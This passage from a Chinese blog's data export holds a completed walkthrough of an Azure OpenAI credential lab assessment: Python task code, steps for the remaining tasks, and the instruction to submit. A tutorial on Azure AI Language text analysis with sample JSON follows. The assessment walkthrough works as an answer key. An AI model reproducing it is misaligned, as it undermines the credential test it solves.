&quot; + response.choices[0].message.content + &quot;\\n&quot;) return response# Task 3: Developer tasksdef function3(aiClient, aiModel): inputText = utils.getPromptInput(&quot;Task 3: Developer tasks&quot;, &quot;sample-text.txt&quot;) # Define system message based on the task system_message = &quot;Generate five unit tests for the function in fibonaci.py.&quot; messages = [ &#123;&quot;role&quot;: &quot;system&quot;, &quot;content&quot;: system_message&#125;, &#123;&quot;role&quot;: &quot;user&quot;, &quot;content&quot;: inputText&#125; ] # Define argument list (Add code here) apiParams = &#123; &quot;model&quot;: aiModel, &quot;messages&quot;: messages, &quot;max_tokens&quot;: 1000, &quot;temperature&quot;: 0.5 &#125; utils.writeLog(&quot;API Parameters:\\n&quot;, apiParams) # Call chat completion connection. (Add code here) # Use the call name and **apiParams to reference our argument list response = aiClient.chat.completions.create(**apiParams) utils.writeLog(&quot;Response:\\n&quot;, str(response)) print(&quot;Response: &quot; + response.choices[0].message.content + &quot;\\n&quot;) return response # Task 4: Use company datadef function4(aiClient, aiModel): inputText = utils.getPromptInput(&quot;Task 4: Use company data&quot;, &quot;sample-text.txt&quot;) # Build messages to send to Azure OpenAI model. (Add code here) search_endpoint = os.getenv(&quot;SEARCH_ENDPOINT&quot;) search_key = os.getenv(&quot;SEARCH_KEY&quot;) search_index = os.getenv(&quot;SEARCH_INDEX&quot;) # Perform the search query search_query = &#123; &quot;search&quot;: inputText, &quot;searchMode&quot;: &quot;any&quot;, &quot;queryType&quot;: &quot;simple&quot;, &quot;top&quot;: 5 # Adjust the number of results as needed &#125; headers = &#123; &quot;Content-Type&quot;: &quot;application/json&quot;, &quot;api-key&quot;: search_key &#125; search_url = f&quot;&#123;search_endpoint&#125;/indexes/&#123;search_index&#125;/docs/search?api-version=2021-04-30-Preview&quot; response = requests.post(search_url, headers=headers, json=search_query) search_results = response.json() # Extract relevant search results search_snippets = [result[&quot;content&quot;] for result in search_results[&quot;value&quot;]] search_content = &quot;\\n\\n&quot;.join(search_snippets) # Build messages for OpenAI with search results included messages = [ &#123;&quot;role&quot;: &quot;system&quot;, &quot;content&quot;: &quot;You are a helpful travel agent.&quot;&#125;, &#123;&quot;role&quot;: &quot;user&quot;, &quot;content&quot;: f&quot;&#123;inputText&#125;\\n\\nSearch Results:\\n&#123;search_content&#125;&quot;&#125; ] # Define connection and argument list (Add code here) apiParams = &#123; &quot;model&quot;: aiModel, &quot;messages&quot;: messages, &quot;max_tokens&quot;: 1000, &quot;temperature&quot;: 0.5 &#125; utils.writeLog(&quot;API Parameters:\\n&quot;, apiParams) # Call chat completion connection. Will be the same as function1 (Add code here) # Use the call name and **apiParams to reference our argument list response = aiClient.chat.completions.create(**apiParams) utils.writeLog(&quot;Response:\\n&quot;, str(response)) print(&quot;Response: &quot; + response.choices[0].message.content + &quot;\\n&quot;) return# Call main function. Do not modify.if __name__ == &#x27;__main__&#x27;: main() 然后将c:\\files下的fibonacci.py，复制到C:\\files\\AzureOpenAIPoc\\Python下，首先删除文件夹中已有的sample-text.txt，并将fibonacci.py重命名为sample-text.txt(！！！注意是sample-text.txt，而不是sample-text.py)。然后关闭原来的命令窗口，重新运行python PoC.py，并输入3、file，查看结果是否产生了5个测试用例。 第四题（最后一题了 加油！！）第四题可依次输入type和When is the best time to visit London?(可使用ctrl+c和ctrl+v进行复制粘贴)进行提问。 完成上述代码测试后，点击界面右下角中的 Submit Assessment 按钮，弹出的确认页面后点击 Submit 按钮。完成凭证证书","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://banjinmei.github.io/tags/Python/"},{"name":"Azure","slug":"Azure","permalink":"https://banjinmei.github.io/tags/Azure/"},{"name":"OpenAI","slug":"OpenAI","permalink":"https://banjinmei.github.io/tags/OpenAI/"}],"author":"mu"},{"title":"Azure OpenAI Language","slug":"Azure-OpenAI-Language","date":"2024-06-04T16:53:20.000Z","updated":"2024-06-05T16:17:02.000Z","comments":true,"path":"2024/06/05/Azure-OpenAI-Language/","permalink":"https://banjinmei.github.io/2024/06/05/Azure-OpenAI-Language/","excerpt":"","text":"使用 Azure AI 语言分析文本每天，世界都会生成大量数据；大部分内容基于文本，其形式包括电子邮件、社交媒体文章、在线评论、业务文档等。 通过应用统计和语义模型的人工智能技术，可以创建从基于文本的数据中提取含义和见解的应用程序。 Azure AI 语言为可轻松集成到你自己的应用程序代码中的常见文本分析技术提供 API。 在本模块中，你将了解如何使用 Azure AI 语言执行以下操作： 检测文本中的语言。分析文本情绪。提取关键短语、实体和链接实体。 预配 Azure AI 语言资源Azure AI 语言旨在帮助从文本中提取信息。 它提供可用于以下各项的功能： 语言检测 - 确定编写文本所用的语言。 关键短语提取 - 标识文本中指示要点的重要单词和短语。 情绪分析 - 量化文本的正负面情绪程度。 命名实体识别 - 检测对实体的引用，包括人员、位置、时间段、组织等。 实体链接 - 通过提供指向维基百科文章的参考链接来标识特定实体。 用于文本分析的 Azure 资源若要使用 Azure AI 语言来分析文本，必须在 Azure 订阅中为其预配资源。 在 Azure 订阅中预配适当的资源后，可以使用其终结点及其密钥之一从代码中调用 Azure AI 语言 API。 可以通过向 REST 接口提交 JSON 格式的请求，或者通过使用特定于编程语言的任何可用 SDK 来调用 Azure AI 语言 API。 注意 本模块的后续单元中的代码示例显示了与 REST 接口交换的 JSON 请求和响应。 使用 SDK 时，会通过用于封装相同数据值的适当对象和方法对 JSON 请求进行抽象。 在本模块后面的练习中，你将有机会亲自尝试使用适用于 C# 或 Python 的 SDK。 检测语言Azure AI 语言检测 API 会评估文本输入，并为提交的每个文档返回带有一个指示分析强度的分数的语言标识符。 此功能对于用于收集语言未知的任意文本的内容存储非常有用。 另一种方案可能涉及聊天机器人。 如果用户使用聊天机器人启动会话，则语言检测可用于确定用户使用的语言，这样你便可以使用适当的语言配置机器人响应。 可以解析此分析的结果，确定输入文档中使用的语言。 响应还会返回一个分数，用于反映模型的置信度（介于 0 到 1 的值）。 语言检测可应用于文档或单个短语。 请注意，文档大小必须小于 5,120 个字符。 大小限制针对每个文档，每个集合限制为 1,000 个项 (ID)。 此处显示了可以在请求正文中向服务提交的格式正确的 JSON 有效负载的示例，包括文档的集合，其中每个文档都包含唯一 ID 以及要分析的文本。 （可选）可以提供 countryHint 以提高预测性能。 12345678910111213141516171819&#123; &quot;kind&quot;: &quot;LanguageDetection&quot;, &quot;parameters&quot;: &#123; &quot;modelVersion&quot;: &quot;latest&quot; &#125;, &quot;analysisInput&quot;:&#123; &quot;documents&quot;:[ &#123; &quot;id&quot;: &quot;1&quot;, &quot;text&quot;: &quot;Hello world&quot;, &quot;countryHint&quot;: &quot;US&quot; &#125;, &#123; &quot;id&quot;: &quot;2&quot;, &quot;text&quot;: &quot;Bonjour tout le monde&quot; &#125; ] &#125;&#125; 服务将返回一个 JSON 响应，其中包含请求正文中每个文档的结果，包括预测到的语言以及指示预测的置信度的值。 置信度是介于 0 和 1 的值，值越接近 1 则置信度越高。 下面是映射到上述请求 JSON 的标准 JSON 响应的示例。 123456789101112131415161718192021222324252627&#123; &quot;kind&quot;: &quot;LanguageDetectionResults&quot;, &quot;results&quot;: &#123; &quot;documents&quot;: [ &#123; &quot;detectedLanguage&quot;: &#123; &quot;confidenceScore&quot;: 1, &quot;iso6391Name&quot;: &quot;en&quot;, &quot;name&quot;: &quot;English&quot; &#125;, &quot;id&quot;: &quot;1&quot;, &quot;warnings&quot;: [] &#125;, &#123; &quot;detectedLanguage&quot;: &#123; &quot;confidenceScore&quot;: 1, &quot;iso6391Name&quot;: &quot;fr&quot;, &quot;name&quot;: &quot;French&quot; &#125;, &quot;id&quot;: &quot;2&quot;, &quot;warnings&quot;: [] &#125; ], &quot;errors&quot;: [], &quot;modelVersion&quot;: &quot;2022-10-01&quot; &#125;&#125; 在我们的示例中，所有语言的置信度均为 1，这主要是因为文本相对简单，易于识别其语言。 如果传入包含多语言内容的文档，该服务的行为会有所不同。 同一文档中的混合语言内容将返回内容中代表性最强但正评级较低的语言，这反映该评估的边界强度。 在以下示例中，输入中包含英语、西班牙语和法语。 分析器使用文本的统计分析来确定主要语言。 12345678&#123; &quot;documents&quot;: [ &#123; &quot;id&quot;: &quot;1&quot;, &quot;text&quot;: &quot;Hello, I would like to take a class at your University. ¿Se ofrecen clases en español? Es mi primera lengua y más fácil para escribir. Que diriez-vous des cours en français?&quot; &#125; ]&#125; 下面的示例显示了此多语言示例的响应。 123456789101112131415&#123; &quot;documents&quot;: [ &#123; &quot;id&quot;: &quot;1&quot;, &quot;detectedLanguage&quot;: &#123; &quot;name&quot;: &quot;Spanish&quot;, &quot;iso6391Name&quot;: &quot;es&quot;, &quot;confidenceScore&quot;: 0.9375 &#125;, &quot;warnings&quot;: [] &#125; ], &quot;errors&quot;: [], &quot;modelVersion&quot;: &quot;2022-10-01&quot;&#125; 最后要考虑的是语言内容多义性的情况。 如果提交了分析器无法分析的文本内容，则可能会发生这种情况，例如由于在将文本转换为字符串变量时出现字符编码问题。 这样一来，语言名称和 ISO 代码的响应将指示 (unknown)，分数值将返回为 0。 下面的示例显示响应的外观。 123456789101112131415&#123; &quot;documents&quot;: [ &#123; &quot;id&quot;: &quot;1&quot;, &quot;detectedLanguage&quot;: &#123; &quot;name&quot;: &quot;(Unknown)&quot;, &quot;iso6391Name&quot;: &quot;(Unknown)&quot;, &quot;confidenceScore&quot;: 0.0 &#125;, &quot;warnings&quot;: [] &#125; ], &quot;errors&quot;: [], &quot;modelVersion&quot;: &quot;2022-10-01&quot;&#125; 提取关键短语关键短语提取是这样一个过程，即评估一个或多个文档的文本，然后围绕文档上下文识别出要点。 关键短语提取最适合大型文档（可分析的最大大小为 5,120 个字符）。 与语言检测一样，使用 REST 接口可以提交一个或多个文档进行分析。 12345678910111213141516171819202122&#123; &quot;kind&quot;: &quot;KeyPhraseExtraction&quot;, &quot;parameters&quot;: &#123; &quot;modelVersion&quot;: &quot;latest&quot; &#125;, &quot;analysisInput&quot;:&#123; &quot;documents&quot;:[ &#123; &quot;id&quot;: &quot;1&quot;, &quot;language&quot;: &quot;en&quot;, &quot;text&quot;: &quot;You must be the change you wish to see in the world.&quot; &#125;, &#123; &quot;id&quot;: &quot;2&quot;, &quot;language&quot;: &quot;en&quot;, &quot;text&quot;: &quot;The journey of a thousand miles begins with a single step.&quot; &#125; ] &#125;&#125; 响应包含在每个文档中检测到的关键短语的列表： 123456789101112131415161718192021222324252627&#123; &quot;kind&quot;: &quot;KeyPhraseExtractionResults&quot;, &quot;results&quot;: &#123; &quot;documents&quot;: [ &#123; &quot;id&quot;: &quot;1&quot;, &quot;keyPhrases&quot;: [ &quot;change&quot;, &quot;world&quot; ], &quot;warnings&quot;: [] &#125;, &#123; &quot;id&quot;: &quot;2&quot;, &quot;keyPhrases&quot;: [ &quot;miles&quot;, &quot;single step&quot;, &quot;journey&quot; ], &quot;warnings&quot;: [] &#125;], &quot;errors&quot;: [], &quot;modelVersion&quot;: &quot;2021-06-01&quot; &#125;&#125; 分析情绪情绪分析用于评估文本文档的正负面情绪程度，这在各种工作负载中非常有用，例如： 通过基于评论量化情绪来评估电影、书籍或产品。 确定客户服务对通过电子邮件或社交媒体消息传送收到的函件的响应的优先级。 使用 Azure AI 语言评估情绪时，响应包括向服务提交的每个文档的总体文档情绪和单个句子情绪。 例如，可以提交单个文档进行情绪分析，如下所示： 12345678910111213141516&#123; &quot;kind&quot;: &quot;SentimentAnalysis&quot;, &quot;parameters&quot;: &#123; &quot;modelVersion&quot;: &quot;latest&quot; &#125;, &quot;analysisInput&quot;: &#123; &quot;documents&quot;: [ &#123; &quot;id&quot;: &quot;1&quot;, &quot;language&quot;: &quot;en&quot;, &quot;text&quot;: &quot;Good morning!&quot; &#125; ] &#125;&#125; 来自服务的响应可能如下所示： 1234567891011121314151617181920212223242526272829303132&#123; &quot;kind&quot;: &quot;SentimentAnalysisResults&quot;, &quot;results&quot;: &#123; &quot;documents&quot;: [ &#123; &quot;id&quot;: &quot;1&quot;, &quot;sentiment&quot;: &quot;positive&quot;, &quot;confidenceScores&quot;: &#123; &quot;positive&quot;: 0.89, &quot;neutral&quot;: 0.1, &quot;negative&quot;: 0.01 &#125;, &quot;sentences&quot;: [ &#123; &quot;sentiment&quot;: &quot;positive&quot;, &quot;confidenceScores&quot;: &#123; &quot;positive&quot;: 0.89, &quot;neutral&quot;: 0.1, &quot;negative&quot;: 0.01 &#125;, &quot;offset&quot;: 0, &quot;length&quot;: 13, &quot;text&quot;: &quot;Good morning!&quot; &#125; ], &quot;warnings&quot;: [] &#125; ], &quot;errors&quot;: [], &quot;modelVersion&quot;: &quot;2022-11-01&quot; &#125;&#125; 句子情绪基于 0 到 1 之间的正面、负面和中性分类值的置信度分数。 总体文档情绪基于句子： 如果所有句子都为中性，则总体情绪为中性。 如果句子分类仅包括正面和中性，则总体情绪为正面。 如果句子分类仅包括负面和中性，则总体情绪为负面。 如果句子分类包括正面和负面，则总体情绪是混合的。 提取实体命名实体识别标识文本中提及的实体。 实体按类别和子类别分组，例如： 人员 位置 DateTime 组织 地址 电子邮件 URL 实体识别的输入类似于其他语言 Azure AI 语言 API 函数的输入： 123456789101112131415&#123; &quot;kind&quot;: &quot;EntityRecognition&quot;, &quot;parameters&quot;: &#123; &quot;modelVersion&quot;: &quot;latest&quot; &#125;, &quot;analysisInput&quot;: &#123; &quot;documents&quot;: [ &#123; &quot;id&quot;: &quot;1&quot;, &quot;language&quot;: &quot;en&quot;, &quot;text&quot;: &quot;Joe went to London on Saturday&quot; &#125; ] &#125;&#125; 响应包括在每个文档中找到的分类实体的列表： 1234567891011121314151617181920212223242526272829303132333435363738&#123; &quot;kind&quot;: &quot;EntityRecognitionResults&quot;, &quot;results&quot;: &#123; &quot;documents&quot;:[ &#123; &quot;entities&quot;:[ &#123; &quot;text&quot;:&quot;Joe&quot;, &quot;category&quot;:&quot;Person&quot;, &quot;offset&quot;:0, &quot;length&quot;:3, &quot;confidenceScore&quot;:0.62 &#125;, &#123; &quot;text&quot;:&quot;London&quot;, &quot;category&quot;:&quot;Location&quot;, &quot;subcategory&quot;:&quot;GPE&quot;, &quot;offset&quot;:12, &quot;length&quot;:6, &quot;confidenceScore&quot;:0.88 &#125;, &#123; &quot;text&quot;:&quot;Saturday&quot;, &quot;category&quot;:&quot;DateTime&quot;, &quot;subcategory&quot;:&quot;Date&quot;, &quot;offset&quot;:22, &quot;length&quot;:8, &quot;confidenceScore&quot;:0.8 &#125; ], &quot;id&quot;:&quot;1&quot;, &quot;warnings&quot;:[] &#125; ], &quot;errors&quot;:[], &quot;modelVersion&quot;:&quot;2021-01-15&quot; &#125;&#125; 若要了解有关实体的详细信息，请参阅生成对话语言理解模型模块。 提取链接的实体在某些情况下，相同的名称可能适用于多个实体。 例如，“Venus”一词的实例是指行星还是神话中的女神？ 实体链接可用于通过引用知识库中的文章来区分同名的实体。 维基百科为文本分析服务提供了知识库。 根据文本中的实体上下文确定特定文章链接。 例如，“I saw Venus shining in the sky”与链接 https://en.wikipedia.org/wiki/Venus 相关联，而“Venus, the goddess of beauty”与 https://en.wikipedia.org/wiki/Venus_(mythology) 相关联。 与所有 Azure AI 语言服务函数一样，你可以提交一个或多个文档进行分析： 12345678910111213141516&#123; &quot;kind&quot;: &quot;EntityLinking&quot;, &quot;parameters&quot;: &#123; &quot;modelVersion&quot;: &quot;latest&quot; &#125;, &quot;analysisInput&quot;: &#123; &quot;documents&quot;: [ &#123; &quot;id&quot;: &quot;1&quot;, &quot;language&quot;: &quot;en&quot;, &quot;text&quot;: &quot;I saw Venus shining in the sky&quot; &#125; ] &#125;&#125; 响应包括文本中标识的实体以及指向相关文章的链接： 12345678910111213141516171819202122232425262728293031&#123; &quot;kind&quot;: &quot;EntityLinkingResults&quot;, &quot;results&quot;: &#123; &quot;documents&quot;: [ &#123; &quot;id&quot;: &quot;1&quot;, &quot;entities&quot;: [ &#123; &quot;bingId&quot;: &quot;89253af3-5b63-e620-9227-f839138139f6&quot;, &quot;name&quot;: &quot;Venus&quot;, &quot;matches&quot;: [ &#123; &quot;text&quot;: &quot;Venus&quot;, &quot;offset&quot;: 6, &quot;length&quot;: 5, &quot;confidenceScore&quot;: 0.01 &#125; ], &quot;language&quot;: &quot;en&quot;, &quot;id&quot;: &quot;Venus&quot;, &quot;url&quot;: &quot;https://en.wikipedia.org/wiki/Venus&quot;, &quot;dataSource&quot;: &quot;Wikipedia&quot; &#125; ], &quot;warnings&quot;: [] &#125; ], &quot;errors&quot;: [], &quot;modelVersion&quot;: &quot;2021-06-01&quot; &#125;&#125; 情绪分析有助于确定文本是负面的还是正面的链接的实体可用于区分同名的常见实体 使用 Azure AI 语言创建问题解答解决方案智能”应用程序的常见模式是使用户能够使用自然语言提问并收到相应的答案。 实际上，此类解决方案将对话智能引入传统的常见问题解答 (FAQ) 发布。 本模块介绍如何使用 Azure AI 语言创建可支持应用程序或机器人的问答对知识库。 了解问题解答及其与语言理解的比较。创建、测试、发布和使用知识库。实现多回合对话和主动学习。创建使用自然语言进行交互的问题解答机器人。 了解问题解答已完成 借助包括问题解答功能的 Azure AI 语言，可以定义可使用自然语言输入查询的问答对知识库。 知识库可以发布到 REST 终结点，并供客户端应用程序（通常是机器人）使用。 可以从现有源创建知识库，其中包括： 包含常见问题解答 (FAQ) 文档的网站。 包含结构化文本的文件，如手册或用户指南。 内置的闲聊问题和用于封装常见对话交流的答案对。 注意 Azure AI 语言的问题解答功能是 QnA 服务的较新版本，该服务仍作为独立的服务存在。 若要了解如何将 QnA Maker 知识库迁移到 Azure AI 语言，请参阅迁移指南。 比较问题解答和 Azure AI 语言理解已完成 问题解答知识库是语言模型的一种形式，它会提出有关何时使用问题解答的问题，以及何时使用 Azure AI 语言的对话语言理解功能。 这两项功能的相似之处在于，它们都允许定义可以使用自然语言表达式查询的语言模型。 但是，它们旨在解决的用例存在一些差异，如下表所示： 问答 语言理解 使用模式 用户提交问题，需要答案 用户提交言语，需要适当的响应或操作 查询处理 服务使用自然语言理解将问题与知识库中的答案进行匹配 服务使用自然语言理解来解释言语、将其与意向匹配，以及识别实体 响应 响应是已知问题的静态答案 响应指示最有可能的意向和引用实体 客户端逻辑 客户端应用程序通常向用户提供答案 客户端应用程序负责根据检测到的意向执行适当的操作 实际上，这两个服务是互补的。 可以构建综合的自然语言解决方案，将语言理解模型与问题解答知识库结合起来。 创建知识库若要创建问题解答解决方案，可以使用 REST API 或 SDK 编写用于定义、训练和发布知识库的代码。 不过，更常见的是使用 Language Studio Web 界面来定义和管理知识库。 若要创建知识库，请执行以下步骤： 登录到 Azure 门户。 使用门户顶部的搜索字段搜索“Azure AI 服务”。 选择“语言服务”资源下的“创建”。 在 Azure 订阅中创建资源： 启用问题解答功能。 创建或选择“Azure AI 搜索”资源来托管知识库索引。 在 Language Studio 中，选择“Azure AI 语言”资源并创建“自定义问题解答”项目。 添加一个或多个数据源以填充知识库： 包含 FAQ 的 Web 页面的 URL。 包含可以从中派生出问题和解答的结构化文本的文件。 预定义的闲聊数据集，其中包括指定样式的常见对话问题和响应。 在门户中编辑问答对。 实现多回合对话已完成 尽管通常可以创建由单个问答对组成的有效知识库，但有时可能需要在提供明确答案之前询问后续问题，以便从用户那里获取更多信息。 这种交互称为多回合对话。 根据现有网页或文档的结构从现有网页或文档中导入问答时，可以启用多回合响应，或者可以为现有问答对显式定义跟进提示和响应。 例如，假设旅行预订知识库的初始问题是“如何取消预订？”。 预订可能指酒店或航班，因此需要跟进提示来阐明此详细信息。 答案可能包含“取消策略取决于预订类型”之类的文本，并包含跟进提示，以及有关取消航班和取消酒店的答案链接。 定义多回合对话的跟进提示时，可以链接到知识库中的现有答案，或专门为跟进定义新答案。 还可以限制链接答案，以便它仅显示在由原始问题发起的多回合对话的上下文中。 测试并发布知识库​​定义知识库后，可以训练其自然语言模型并测试该模型，然后发布，以便在应用程序或机器人中使用。​ 测试知识库​你可以在语言工作室中，通过提交问题并查看返回的答案来交互测试知识库。 可以检查结果以查看其置信度分数以及其他可能的答案。​​ 部署知识库​如果对知识库的性能满意，可以将其部署到 REST 终结点，客户端应用程序可以使用该函数来提交问题和接收答案。 可以直接从 Language Studio 部署它。​ 使用知识库若要使用已发布的知识库，可以使用 REST 接口。 函数的最小请求正文包含一个问题，如下所示： 1234567891011&#123; &quot;question&quot;: &quot;What do I need to do to cancel a reservation?&quot;, &quot;top&quot;: 2, &quot;scoreThreshold&quot;: 20, &quot;strictFilters&quot;: [ &#123; &quot;name&quot;: &quot;category&quot;, &quot;value&quot;: &quot;api&quot; &#125; ]&#125; properties 说明 问题 要发送到知识库的问题。 top 要返回的最大答案数。 scoreThreshold 返回的答案的分数阈值。 strictFilters 限制为仅包含指定元数据的答案。 响应包括知识库中最接近的问题匹配，以及关联的答案、置信度分数和有关问答对的其他元数据： 12345678910111213141516171819&#123; &quot;answers&quot;: [ &#123; &quot;score&quot;: 27.74823341616769, &quot;id&quot;: 20, &quot;answer&quot;: &quot;Call us on 555 123 4567 to cancel a reservation.&quot;, &quot;questions&quot;: [ &quot;How can I cancel a reservation?&quot; ], &quot;metadata&quot;: [ &#123; &quot;name&quot;: &quot;category&quot;, &quot;value&quot;: &quot;api&quot; &#125; ] &#125; ]&#125; 提高问题解答性能创建和测试知识库后，可以通过“主动学习”和定义“同义词”来改善其性能。 使用主动学习主动学习可帮助你进行持续改进，以便随着时间的推移更好地正确回答用户问题。 人们经常会问一些措辞不同但最终含义相同的问题。 在此类情况下，主动学习会有所帮助，因为它可以让你考虑每个问答对的备选问题。 默认情况下，主动学习处于启用状态。 若要使用主动学习，可以执行以下操作： 创建问答对在 Language Studio 中为项目创建问题和答案对。 还可以导入包含要批量上传的问答对的文件。 审阅建议然后，主动学习开始为问答对中的每个问题提供备选问题。 可从“查看建议”窗格访问此内容： 查看，然后通过选择备选短语旁边的复选标记或删除符号来接受或拒绝针对每个问题建议的这些备选短语。 可以使用顶部的“接受所有建议”或“拒绝所有建议”选项批量接受或拒绝建议。 在“编辑知识库”窗格中为对选择“添加备选问题”时，还可以手动添加备选问题： 定义同义词当用户提交的问题可能包含多个不同的字词来表示相同内容时，同义词很有用。 例如，一家旅游代理商的客户可能会提到“预留”或“预订”。 通过将这些关键词定义为同义词，无论个人客户使用哪一术语，问题解答服务都可以找到相应的答案。 若要定义同义词，请使用 REST API 按以下 JSON 格式提交同义词： 12345678910&#123; &quot;synonyms&quot;: [ &#123; &quot;alterations&quot;: [ &quot;reservation&quot;, &quot;booking&quot; ] &#125; ]&#125; 可以从现有文档或网页创建知识库。若要向问题添加多回合上下文，请定义跟进提示。你可以为已发布的知识库创建机器人，并配置电子邮件通信通道。 生成对话语言理解模型介绍自然语言处理 (NLP) 是一个常见的 AI 问题，即软件必须能够以人类用户书写或说话所用的自然语言形式处理文本或语音。 在更广泛的 NLP 领域中，自然语言理解 (NLU) 处理从自然语言确定语义含义的问题，通常使用训练的语言模型来确定。 自然语言理解解决方案的常见设计模式如下所示： 在此设计模式中： 应用接受来自用户的自然语言输入。 语言模型用于确定语义含义（用户的意向）。 应用执行相应操作。 Azure AI 语言使开发人员能够基于可使用数量相对较少的示例训练的语言模型来生成应用，从而识别用户的预期含义。 本模块介绍如何相关服务来创建使用 Azure AI 语言的自然语言理解应用。 完成此模块后，你将能够： 预配 Azure AI 语言资源。 定义意向、实体和语句。 使用模式区分相似的言语。 使用预生成的实体组件。 训练、测试、发布和查看模型。 了解 Azure AI 语言服务的预生成功能Azure AI 语言服务提供各种功能来理解人类语言。 可以使用每项特征更好地与用户通信，更好地了解传入通信，或者使用多项特征以便更深入地了解用户所表达内容、意向和询问内容。 Azure AI 语言服务功能分为两类：预配置的功能和习得的功能。 学习到的特征需要生成和训练一个模型来正确预测适当的标签，本模块即将推出的单元将对此进行介绍。 本单元会介绍 Azure AI 语言服务的大部分功能，但请参考 Azure AI 语言服务文档获取完整列表，其中包括快速入门和所有可用内容的完整说明。 在应用中使用这些特征需要将查询发送到相应的终结点。 用于查询特定特征的终结点各不相同，但所有这些终结点都带有在 Azure 帐户中创建的 Azure AI 语言资源前缀，无论是生成 REST 请求，还是使用 SDK 定义客户端。 可以在下一个单元中找到每个示例。 预配置的功能Azure AI 语言服务提供的部分功能不需要任何模型标记和训练。 创建资源后，可以发送数据并在应用中使用返回的结果。 以下功能都是预配置的。 汇总摘要可用于文档和对话，可将文本汇总到关键句中，系统通过对关键句进行预测来概括输入的含义。 命名实体识别命名实体识别可以提取和标识实体（如人员、地点或公司），使应用能够识别不同类型的实体，从而改进自然语言响应。 例如能从“The waterfront pier is my favorite Seattle attraction”中识别出“Seattle”，并将其分类为地点。 个人身份信息 (PII) 检测使用 PII 检测，可以识别、分类和编辑可能被视为敏感信息的信息，例如电子邮件地址、家庭地址、IP 地址、姓名和受保护的运行状况信息。 例如，如果查询中包含文本“&#x65;&#109;&#x61;&#x69;&#108;&#x40;&#x63;&#x6f;&#110;&#116;&#x6f;&#115;&#111;&#46;&#x63;&#x6f;&#x6d;”，则可以识别和修改整个电子邮件地址。 关键短语提取关键短语提取是可快速从提供的文本中提取主要概念的功能。 例如，该服务能从“Text Analytics is one of the features in Azure AI Services.”中识别出“Azure AI Services”和“Text Analytics”。 情绪分析情绪分析标识字符串或文档是正面还是负面的。 例如该服务能从“Great hotel. Close to plenty of food and attractions we could walk to”中识别出正面的结果，且具有相对较高的置信度分数。 语言检测语言检测采用一个或多个文档，并识别每个文档的语言。 例如该服务能从其中一份“Bonjour”文档识别出法语的结果。 学习的功能学习的功能要求你标记数据、训练和部署模型，使其可在应用程序中使用。 这些功能允许自定义预测或提取的信息。 注意 数据质量极大地影响模型的准确性。 请留意使用的数据、数据的标记情况以及训练数据的多样化程度。 有关详细信息，请参阅有关标记数据的建议，其中包括针对标记数据的宝贵指南。 另请参阅评估指标，可帮助你了解模型需要改进的地方。 对话语言理解 (CLU)CLU 是 Azure AI 语言提供的核心自定义功能之一。 CLU 可帮助用户生成自定义自然语言理解模型来预测整体意向，并从传入言语中提取重要信息。 CLU 要求用户标记数据，以让其学习如何准确预测意向和实体。 本模块中的练习将生成 CLU 模型并在应用中使用它。 自定义命名实体识别自定义实体识别采用自定义标记数据，并从非结构化文本中提取指定的实体。 例如，如果有需要从中提取当事人的各种合同文档，可以通过训练模型让模型知道如何进行预测。 自定义文本分类使用自定义文本分类，用户可以将文本或文档分类为自定义组。 例如，可以训练模型来查看新闻文章，并确定这些信息的所述类别，例如“新闻”或“娱乐”。 问答问题解答是一项在大多数情况下会预配的功能，可解答作为输入提供的问题。 回答这些问题的数据来自常见问题解答或手册等文档。 例如，假设你想要在公司网站上创建虚拟聊天助手来回答常见问题。 可以使用公司常见问题解答作为输入文档来创建问题和答案对。 部署后，聊天助手可以将输入问题传递给服务，并以结果形式获取解答。 若要查看功能的完整列表以及使用方法，请参阅 Azure AI 语言文档。 了解用于生成对话语言理解模型的资源 9 分钟 若要使用语言理解服务开发 NLP 解决方案，需要在 Azure 中创建语言资源。 该资源将用于创作模型和处理来自客户端应用程序的预测请求。 提示 本模块的实验室介绍如何构建用于对话语言理解的模型。 有关自定义文本分类和自定义命名实体识别的更多重点模块，请参阅开发自然语言解决方案学习路径中的自定义解决方案模块。 构建你的模型对于需要模型进行预测的功能，需要先生成、训练并部署模型，才能将其用于预测。 通过生成和训练让 Azure AI 语言服务学习要查找的内容。 首先，需要在 Azure 门户中创建 Azure AI 语言资源。 然后： 搜索 Azure AI 服务。 查找并选择“语言服务”。 选择“语言服务”下的“创建”。 填写必要的详细信息，选择在地理位置上最靠近的区域（以获得最佳性能），并为其提供唯一的名称。 创建该资源后，需要密钥和终结点。 可以在资源概述页的“密钥和终结点”下的左侧找到该信息。 使用语言工作室若要更直观地生成、训练和部署模型，可以使用 Language Studio 来实现上述每个步骤。 在主页上，可以选择创建对话语言理解项目。 创建项目后，请完成与上述内容相同的过程来生成、训练和部署模型。 本模块中的实验室将逐步讲解如何使用 Language Studio 生成模型。 若要了解详细信息，请参阅 Language Studio 快速入门 使用 REST API生成模型的一种方法是通过 REST API 生成。 该模式是创建项目、导入数据、训练、部署，然后使用模型。 这些任务以异步方式完成；需要向每个步骤的相应 URI 提交请求，然后发送另一个请求以获取该作业的状态。 例如，如果要为对话语言理解项目部署模型，则需要提交部署作业，然后检查部署作业状态。 身份验证对于对 Azure AI 语言资源的每个调用，可以通过提供以下标头对请求进行身份验证。 密钥 值 Ocp-Apim-Subscription-Key 资源密钥 请求部署将 POST 请求提交到以下终结点。 1&#123;ENDPOINT&#125;/language/authoring/analyze-conversations/projects/&#123;PROJECT-NAME&#125;/deployments/&#123;DEPLOYMENT-NAME&#125;?api-version=&#123;API-VERSION&#125; 占位符 值 示例 &#123;ENDPOINT&#125; Azure AI 语言资源的终结点 https://&lt;your-subdomain&gt;.cognitiveservices.azure.com &#123;PROJECT-NAME&#125; 项目名称。 此值区分大小写 myProject &#123;DEPLOYMENT-NAME&#125; 部署名称。 此值区分大小写 staging &#123;API-VERSION&#125; 要调用的 API 版本 2022-05-01 请在请求中包括以下 body。 123&#123; &quot;trainedModelLabel&quot;: &quot;&#123;MODEL-NAME&#125;&quot;,&#125; 占位符 值 &#123;MODEL-NAME&#125; 将要分配给部署的模型名称。 此值区分大小写。 若成功提交请求，将收到 202 响应，并带有响应标头 operation-location。 此标头将具有一个 URL，用于请求状态，格式如下所示： 1&#123;ENDPOINT&#125;/language/authoring/analyze-conversations/projects/&#123;PROJECT-NAME&#125;/deployments/&#123;DEPLOYMENT-NAME&#125;/jobs/&#123;JOB-ID&#125;?api-version=&#123;API-VERSION&#125; 获取部署状态将 GET 请求提交到上述响应标头中的 URL。 这些值已根据初始部署请求填写。 